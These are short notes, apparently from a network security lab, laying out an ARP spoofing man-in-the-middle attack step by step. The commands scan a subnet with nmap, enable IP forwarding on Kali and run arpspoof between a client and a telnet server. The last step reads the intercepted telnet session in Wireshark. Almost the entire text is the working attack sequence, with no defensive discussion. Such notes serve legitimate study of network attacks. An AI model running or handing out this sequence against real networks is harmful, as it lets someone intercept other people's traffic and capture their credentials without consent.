we need to identify where is the server (telnet 23) and client and gateway
 - nmap IP/24 

Configure the Kali instance to forward IP packets:
- echo 1 > /proc/sys/net/ipv4/ip_forward

ARP poisoning attack 
- arpspoof -i eth1 -t Client_IP -r telenet_server_IP

open wireshark and filter on telnet --> follow tcp stream 
